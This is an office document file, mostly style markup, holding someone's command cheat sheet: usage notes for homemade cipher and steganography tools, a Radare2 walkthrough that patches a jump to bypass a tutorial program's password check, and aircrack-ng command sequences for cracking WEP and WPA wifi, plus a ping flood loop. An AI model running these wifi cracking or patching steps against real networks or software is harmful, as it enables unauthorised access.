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0ca1" officeooo:paragraph-rsid="001a0ca1" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001a27a6" officeooo:paragraph-rsid="001a27a6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001b503d" officeooo:paragraph-rsid="001b503d" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001c0866" officeooo:paragraph-rsid="001c0866" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001c0866" officeooo:paragraph-rsid="00234721" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001c0866" officeooo:paragraph-rsid="00251eb9" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001d838d" officeooo:paragraph-rsid="001d838d" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00265b2c" officeooo:paragraph-rsid="00265b2c" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001a0ca1" officeooo:paragraph-rsid="001a0ca1" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001a27a6" officeooo:paragraph-rsid="001a27a6" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001c0866" officeooo:paragraph-rsid="001c0866" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001c0866" officeooo:paragraph-rsid="0020e563" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001c0866" officeooo:paragraph-rsid="00234721" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001c0866" officeooo:paragraph-rsid="00251eb9" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001d838d" officeooo:paragraph-rsid="001d838d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001d838d" officeooo:paragraph-rsid="001f1917" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="italic" officeooo:rsid="001a5166" officeooo:paragraph-rsid="001a5166" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="001c9522" officeooo:paragraph-rsid="001c9522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1a5166" officeooo:paragraph-rsid="001a516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officeooo:rsid="001b503d" officeooo:paragraph-rsid="001b503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position="sub 58%" fo:font-weight="normal" officeooo:rsid="001d838d" officeooo:paragraph-rsid="001d838d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0022705a"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="001d838d" officeooo:paragraph-rsid="001d838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2pt" fo:font-weight="bold" officeooo:rsid="0026880a" officeooo:paragraph-rsid="0026880a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2e6010" officeooo:paragraph-rsid="002e6010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2e6010" officeooo:paragraph-rsid="002eff46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2eff46" officeooo:paragraph-rsid="002eff46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fea36" officeooo:paragraph-rsid="002fea36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normal" officeooo:rsid="00280ec3" officeooo:paragraph-rsid="00280ec3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94d1c" officeooo:paragraph-rsid="00294d1c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2af9e8" officeooo:paragraph-rsid="002af9e8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b063b" officeooo:paragraph-rsid="002b063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2b063b" officeooo:paragraph-rsid="002b87f4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d6c1d" officeooo:paragraph-rsid="002d6c1d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e6010" officeooo:paragraph-rsid="002e601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e6010" officeooo:paragraph-rsid="00300552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eff46" officeooo:paragraph-rsid="002e6010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eff46" officeooo:paragraph-rsid="002eff46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fea36" officeooo:paragraph-rsid="002fea36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style="normal" fo:font-weight="normal" officeooo:rsid="00300552" officeooo:paragraph-rsid="0030055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2e6010" officeooo:paragraph-rsid="00300552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size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00300552" officeooo:paragraph-rsid="00300552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font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00300552" officeooo:paragraph-rsid="00300552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normal" fo:font-weight="normal" officeooo:rsid="002b87f4" officeooo:paragraph-rsid="002b87f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weight="normal" officeooo:rsid="002e6010" officeooo:paragraph-rsid="002eff46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bold" officeooo:rsid="0026880a" officeooo:paragraph-rsid="0026880a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2e6010" officeooo:paragraph-rsid="002e6010" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0022705a" officeooo:paragraph-rsid="00265b2c" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="003303f5" officeooo:paragraph-rsid="003303f5" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-position="sub 58%" fo:font-weight="normal" officeooo:rsid="001d838d" officeooo:paragraph-rsid="001d838d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-position="sub 58%" fo:font-weight="bold" officeooo:rsid="003303f5" officeooo:paragraph-rsid="003303f5" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001d838d" officeooo:paragraph-rsid="0034a0ec" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001c0866" officeooo:paragraph-rsid="00251eb9" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001c0866" officeooo:paragraph-rsid="0034a0ec" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001c0866" officeooo:paragraph-rsid="00351ef5" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001c0866" officeooo:paragraph-rsid="003855cb" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001a27a6" officeooo:paragraph-rsid="00370163" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0034a0ec"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001a27a6"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="001a516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a5166" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="003855cb" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="001f1917"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="0020e563"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001d838d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="00251eb9"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="002a8574"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties officeooo:rsid="002af9e8"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties officeooo:rsid="002b063b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b87f4" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties officeooo:rsid="002e6010"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:text-position="super 58%"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="002fea36"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="0034a0ec"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="00351ef5"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="003540ec"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties officeooo:rsid="003701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ary Program</text:p>
      <text:p text:style-name="P9">./<text:span text:style-name="T1">binary &lt; file.txt</text:span></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Vigenere Cipher</text:p>
      <text:p text:style-name="P19">Encode</text:p>
      <text:p text:style-name="P10">./vigenere -e <text:span text:style-name="T3">mykey </text:span><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*<text:span text:style-name="T21">with specific key </text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P19">Decode</text:p>
      <text:p text:style-name="P57">./<text:span text:style-name="T2">vigenere -d </text:span><text:span text:style-name="T4">MYKEY <text:tab/></text:span><text:span text:style-name="T2"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>*<text:span text:style-name="T21">with specific key </text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P17">Input Encode</text:p>
      <text:p text:style-name="Standard">./vigenere -e "This is my key" &gt; ciphertext.txt</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P17">Input Decode</text:p>
      <text:p text:style-name="P17">./vigenere -d "This is my key" &lt; ciphertext.txt</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P3">Timelock</text:p>
      <text:p text:style-name="P20">./timelock &lt; epoch.txt</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">echo "1999 12 31 23 59 59" <text:s/>| <text:s/>./timelock</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">XOR</text:p>
      <text:p text:style-name="P11">./xor &lt; plaintext &gt; ciphertext.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P4">Steg</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P11">./steg <text:s/>-(bB) <text:s/>-(sr) <text:s/>-o&lt;val&gt; <text:s/>[-i&lt;val&gt;] -w&lt;val&gt; [-h&lt;val&gt;]</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">-b <text:tab/><text:tab/><text:tab/>Use the bit method </text:p>
      <text:p text:style-name="P11">-B <text:tab/><text:tab/><text:tab/>Use the byte method</text:p>
      <text:p text:style-name="P11">-s <text:tab/><text:tab/><text:tab/>Store (and hide) data </text:p>
      <text:p text:style-name="P11">-r <text:tab/><text:tab/><text:tab/>Retrieve hidden data </text:p>
      <text:p text:style-name="P11">-o&lt;val&gt; <text:tab/><text:tab/>Set offset to &lt;val&gt;</text:p>
      <text:p text:style-name="P11">-i&lt;val&gt; <text:tab/><text:tab/>Set interval to &lt;val&gt;</text:p>
      <text:p text:style-name="P11">-w&lt;val&gt; <text:tab/>Set wrapper file to &lt;val&gt;</text:p>
      <text:p text:style-name="P11">-h&lt;val&gt; <text:tab/><text:tab/>Set hidden file to &lt;val&gt;</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P18">Encrypt </text:p>
      <text:p text:style-name="P11">./steg -B -s -o1024 -i256 -wimage.jpg -hsecret.jpg &gt; new.jpg <text:span text:style-name="T3"><text:tab/><text:tab/>*</text:span><text:span text:style-name="T5">makes new file for you</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P18">Decrypt</text:p>
      <text:p text:style-name="P56">./steg -B -r -o1024 -i256 -wnew.jpg &gt; extracted.jpg<text:tab/><text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">*</text:span><text:span text:style-name="T5">makes new file for you</text:span></text:p>
      <text:p text:style-name="P11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Reverse Engineer <text:span text:style-name="T15">(note address files are from example from tutorials)</text:span></text:p>
      <text:p text:style-name="P30">sudo apt-get install git build-essential<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*needed to get build for Radare2</text:p>
      <text:p text:style-name="P30">git clone <text:a xlink:type="simple" xlink:href="https://github.com/radare/radare2" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/radare/radare2</text:a></text:p>
      <text:p text:style-name="P30">cd radare2</text:p>
      <text:p text:style-name="P30">sys/install.sh</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P29">Compile and execute program</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P29">r2 -d countdown<text:tab/><text:tab/><text:tab/>*launch Radare 2 with desire program</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P29">?<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*<text:span text:style-name="T10">help</text:span></text:p>
      <text:p text:style-name="P31">iI<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*info on binary executable</text:p>
      <text:p text:style-name="P31">ie<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*list entry points</text:p>
      <text:p text:style-name="P31">iM<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*main entry point</text:p>
      <text:p text:style-name="P31">is<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*various symbols in binary executable </text:p>
      <text:p text:style-name="P30">iz<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*defined strings <text:span text:style-name="T11">in binary executable</text:span></text:p>
      <text:p text:style-name="P30">aaa<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*analysis of <text:span text:style-name="T12">binary executable</text:span></text:p>
      <text:p text:style-name="P30">s main<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*disassembled code in main function </text:p>
      <text:p text:style-name="P30">v<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*vi<text:span text:style-name="T12">sual mode</text:span></text:p>
      <text:p text:style-name="P32">q<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*quit</text:p>
      <text:p text:style-name="P32">ood<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*reload binary executable </text:p>
      <text:p text:style-name="P32">B<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*set breakpoint at reference</text:p>
      <text:p text:style-name="P34">dc<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*debug</text:p>
      <text:p text:style-name="P34">db <text:span text:style-name="T3">referecence<text:tab/><text:tab/><text:tab/>*</text:span><text:span text:style-name="T13">another method to set breakpoint</text:span></text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P44">Next, we can see what instruction (actually, its memory address) references the string “SUCCESS”:</text:p>
      <text:p text:style-name="P44">axt 0x00401814</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44">It appears that it is referenced from the main function at address 0x40142d on my system:</text:p>
      <text:p text:style-name="P44">main 0x40142d [data] mov esi, str.SUCCESS</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44">Let's seek there and check it out in visual mode:</text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T14">s 0x40142d</text:span><text:span text:style-name="T3"><text:tab/></text:span></text:p>
      <text:p text:style-name="P34">v</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34">hit breakpoint at: 40142b <text:tab/><text:tab/>*if breakpoint works</text:p>
      <text:p text:style-name="P34">dc</text:p>
      <text:p text:style-name="P34">dc</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P25">break password</text:p>
      <text:p text:style-name="P35">ood </text:p>
      <text:p text:style-name="P35">dc</text:p>
      <text:p text:style-name="P35">dr zf <text:tab/><text:tab/><text:tab/><text:tab/>*status of z-bit</text:p>
      <text:p text:style-name="P35">dr zf=0<text:tab/><text:tab/><text:tab/><text:tab/>*sets z-bit to 0</text:p>
      <text:p text:style-name="P35">dc </text:p>
      <text:p text:style-name="P35">dc </text:p>
      <text:p text:style-name="P35">q</text:p>
      <text:p text:style-name="P35">*test program </text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P26"><text:soft-page-break/>patching</text:p>
      <text:p text:style-name="P45">r2 -w password <text:tab/><text:tab/><text:tab/><text:tab/>*patching desire program</text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P27">1<text:span text:style-name="T16">st</text:span> ways</text:p>
      <text:p text:style-name="P35">s <text:span text:style-name="T3">0x0040142b</text:span><text:tab/><text:tab/><text:tab/><text:tab/>*JE instruction</text:p>
      <text:p text:style-name="P37">“wa nop; nop”<text:tab/><text:tab/><text:tab/><text:tab/>*two NOPS/ <text:span text:style-name="T17">make sure change is was successful </text:span></text:p>
      <text:p text:style-name="P39">v</text:p>
      <text:p text:style-name="P39">p</text:p>
      <text:p text:style-name="P39">p</text:p>
      <text:p text:style-name="P39">*note the code surround with NOPs</text:p>
      <text:p text:style-name="P39">q</text:p>
      <text:p text:style-name="P39">q</text:p>
      <text:p text:style-name="P39">Exit radare and run program</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P28">2<text:span text:style-name="T16">nd</text:span> ways</text:p>
      <text:p text:style-name="P36">s <text:span text:style-name="T3">0x0040142b</text:span></text:p>
      <text:p text:style-name="P40">wao recj</text:p>
      <text:p text:style-name="P40">v</text:p>
      <text:p text:style-name="P40">p </text:p>
      <text:p text:style-name="P40">p</text:p>
      <text:p text:style-name="P40">Test program</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P42">3<text:span text:style-name="T16">rd</text:span> way</text:p>
      <text:p text:style-name="P41">s <text:span text:style-name="T3">0x0040142b</text:span></text:p>
      <text:p text:style-name="P40">v</text:p>
      <text:p text:style-name="P40">p </text:p>
      <text:p text:style-name="P40">p</text:p>
      <text:p text:style-name="P43">The JE instruction is at 0x0040142b. The beginning of the “FAILURE.” result is at 0x0040143e. Thebeginning of the “SUCCESS!” result is at 0x0040142d. Currently, the JE instruction jumps to the</text:p>
      <text:p text:style-name="P43">“FAILURE.” result. We can change the target address from 0x0040143e to 0x0040142d. Exit visual</text:p>
      <text:p text:style-name="P43">mode:</text:p>
      <text:p text:style-name="P40">q</text:p>
      <text:p text:style-name="P40">wa je <text:span text:style-name="T3">target address<text:tab/><text:tab/><text:tab/></text:span>*target address/make sure change was written</text:p>
      <text:p text:style-name="P40">v</text:p>
      <text:p text:style-name="P40">q</text:p>
      <text:p text:style-name="P40">q</text:p>
      <text:p text:style-name="P40">Test program</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P23"><text:soft-page-break/>Hack Wifi</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">WEP shortcuts</text:p>
      <text:p text:style-name="P15">int=wlan1<text:tab/><text:tab/><text:tab/><text:tab/>*get alpha card name: ifconfig</text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T8">mac=</text:span>00:c0:ca:58:f6:51<text:span text:style-name="T8"><text:tab/>*get address</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">sudo iwlist $int scan | grep -E '(Address:|Channel:|ESSID:)'<text:tab/>*<text:span text:style-name="T6">scans wifi</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P16">essid=goodVevil <text:tab/><text:tab/><text:tab/><text:tab/>*<text:span text:style-name="T6">name of wifi</text:span></text:p>
      <text:p text:style-name="P16">bssid=00:25:9C:41:31:DE <text:tab/>*<text:span text:style-name="T6">ID of device</text:span></text:p>
      <text:p text:style-name="P16">chan=11<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*<text:span text:style-name="T6">channel of device</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">sudo stop network-manager</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">sudo ifconfig $int down <text:tab/><text:tab/>*<text:span text:style-name="T7">stops alpha </text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P4">connect eth0 (wired) to AP in terminal 4 (or do so from another machine):</text:p>
      <text:p text:style-name="P12">sudo ifconfig eth0 up </text:p>
      <text:p text:style-name="P12">sudo dhclient eth0</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P48">monitoring mode</text:p>
      <text:p text:style-name="P12">sudo airmon-ng start $int $chan<text:tab/></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P8">Capture packets</text:p>
      <text:p text:style-name="P12">sudo airodump-ng -c $chan --bssid $bssid -w output mon0</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P8">Replay packets: IVs are generated authenticate (handshake)</text:p>
      <text:p text:style-name="P12">sudo aireplay-ng -1 0 -e $essid -a $bssid -h $mac mon0</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P4">generate IVs</text:p>
      <text:p text:style-name="P11">sudo aireplay-ng -3 -b $bssid -h $mac mon0</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">sudo aircrack-ng -b $bssid output*.cap</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13">for ((i=2; i&lt;255; i+=10)); do sudo ping -f -I eth0 -W 0.01 192.168.1.$i; done </text:p>
      <text:p text:style-name="P5">press ctrl+c repeatedly to go to the next IP address in the for loop</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P14">sudo airmon-ng stop mon0 </text:p>
      <text:p text:style-name="P14">sudo rm output*<text:tab/><text:tab/><text:tab/><text:tab/>*<text:span text:style-name="T9">deletes files</text:span></text:p>
      <text:p text:style-name="P14">sudo rm replay*<text:tab/><text:tab/><text:tab/><text:tab/>*<text:span text:style-name="T9">deletes files</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P6">restart the network manager: </text:p>
      <text:p text:style-name="P14">sudo NetworkManager</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P49"><text:soft-page-break/>WPA</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P52">int=wlan1<text:tab/><text:tab/><text:tab/><text:tab/>*get alpha card name: ifconfig</text:p>
      <text:p text:style-name="P58"><text:span text:style-name="T8">mac=</text:span>00:c0:ca:58:f6:51<text:span text:style-name="T8"><text:tab/>*get address</text:span></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P52">sudo iwlist $int scan | grep -E '(Address:|Channel:|ESSID:)'<text:tab/>*<text:span text:style-name="T6">scans wifi</text:span></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P52">essid=goodVevil <text:tab/><text:tab/><text:tab/><text:tab/>*<text:span text:style-name="T6">name of wifi</text:span></text:p>
      <text:p text:style-name="P52">bssid=00:25:9C:41:31:DE <text:tab/>*<text:span text:style-name="T6">ID of device</text:span></text:p>
      <text:p text:style-name="P52">chan=11<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>*<text:span text:style-name="T6">channel of device</text:span></text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P54">sudo stop network-manager</text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P54">sudo ifconfig $int down <text:tab/><text:tab/>*<text:span text:style-name="T7">stops alpha </text:span></text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P54">sudo airmon-ng start $int $chan</text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P54">sudo airodump-ng -c $chan --bssid $bssid -w output mon0<text:tab/><text:tab/>*<text:span text:style-name="T20">monitor mode/capture handshake</text:span></text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P54">sudo aircrack-ng -w words.txt -b $bssid output*.cap<text:tab/><text:tab/><text:tab/><text:tab/>*<text:span text:style-name="T18">check pw with file</text:span></text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P54">sudo aircrack-ng -w morewords.txt -b $bssid output*.cap<text:tab/><text:tab/>*<text:span text:style-name="T18">check pw with file</text:span></text:p>
      <text:p text:style-name="P54"><text:tab/></text:p>
      <text:p text:style-name="P55">sudo airmon-ng stop mon0 </text:p>
      <text:p text:style-name="P55">sudo rm output-*.kismet.* </text:p>
      <text:p text:style-name="P55">sudo rm output-*.csv</text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55">sudo rm output-*.cap</text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55">sudo NetworkManager<text:tab/><text:tab/><text:tab/>*<text:span text:style-name="T19">restart manager</text:span></text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P5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5:22:26.220779173</meta:creation-date>
    <dc:date>2018-05-03T21:41:00.579469277</dc:date>
    <meta:editing-duration>PT1H48M12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5" meta:paragraph-count="151" meta:word-count="702" meta:character-count="4462" meta:non-whitespace-character-count="3705"/>
  </office:meta>
</office:document-meta>
</file>